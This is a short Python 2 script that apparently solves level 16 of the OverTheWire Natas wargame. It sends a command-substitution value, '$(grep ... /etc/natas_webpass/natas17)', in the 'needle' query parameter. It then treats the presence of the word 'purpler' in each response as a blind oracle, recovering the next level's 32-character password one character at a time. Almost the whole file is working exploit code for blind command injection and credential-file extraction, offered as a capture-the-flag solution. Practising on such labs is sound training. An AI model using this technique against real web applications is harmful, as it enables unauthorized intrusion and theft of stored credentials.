#!/usr/bin/env python
import sys
import requests

target = 'http://natas16.natas.labs.overthewire.org/index.php'
auth = ('natas16','<redacted>')
chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
false = 'purpler'
keyspace = ''
password = ''

print '[+] Starting..'

for c in chars:
    r = requests.get(target+'?needle=$(grep '+c+\
            ' /etc/natas_webpass/natas17)purpler', auth=auth)
    sys.stdout.write('\r[+] Keyspace: {}{}'.format(keyspace,c))
    sys.stdout.flush()
    if r.content.find(false) == -1:
        keyspace += c

sys.stdout.write('\n')

while len(password) != 32:
    for c in keyspace:
        r = requests.get(target+'?needle=$(grep ^'+password+c+\
                ' /etc/natas_webpass/natas17)purpler', auth=auth)
        sys.stdout.write('\r[+] Password: {}{}'.format(password,c))
        sys.stdout.flush()
        if r.content.find(false) == -1:
	    password += c
	    break

sys.stdout.write('\n')
print '[+] Complete..'
